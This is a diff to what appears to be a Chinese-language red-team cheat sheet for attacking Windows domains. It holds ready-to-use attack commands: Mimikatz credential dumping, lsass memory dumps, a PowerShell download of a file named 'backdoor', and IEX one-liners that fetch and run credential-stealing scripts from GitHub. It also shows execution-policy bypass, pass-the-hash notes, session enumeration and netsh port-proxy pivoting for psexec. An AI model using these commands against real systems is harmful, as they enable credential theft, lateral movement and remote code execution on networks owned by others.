@@ -34,6 +34,7 @@ net use * /del
 2 第二种方式是把 powershell 文件上传到堡垒机本地执行， powershell.exe ". .\Invoke-Mimikatz.ps1; Invoke-Mimikatz –DumpCreds"
 													   powershell.exe ". .\Out-Minidump.ps1;Get-Process lsass|Out-Minidump" 将导出的dmp文件，传回本地，sekurlsa::minidump xxx.dmp  sekurlsa::logonPasswords就可以得到密码
 													   PowerShell.exe -exec Bypass -File .\runme.ps1 可以用于反弹shell
+													   PowerShell.exe -exec Bypass -command ""
 													   powershell (new-object Net.WebClient).DownloadFile( 'http://192.168.200.159/backdoor','backdoor.bat') 下载文件，与Linux wget类似
 													   powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1');Get-PassHashes 直接dump hash
 													   powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
@@ -235,11 +236,16 @@ https://xianzhi.aliyun.com/forum/read/1882.html  Active Directory中获取域管
 dsquery
 dsquery server        #查看域控服务器
 dsquery subnet        #查看域IP范围
-
+impacket hash传递LM可以为空
 
 adfind LDAP查询
 ldifde 信息收集
-
+psloggedon.exe，netsess.exe
 
 nltest 来测试一个域中的域控制器和运行Windows NT的域成员之间的信任关系
 NTLTEST使用可以参考：http://technet.microsoft.com/zh-cn/library/cc731935
+
+netsh interface portproxy add v4to listenaddress=ip1 listenport=port1 connectaddress=ip2 connect=port2
+netsh interface portproxy dump
+netsh interface portproxy reset
+修改psexec 源码的端口改为port1
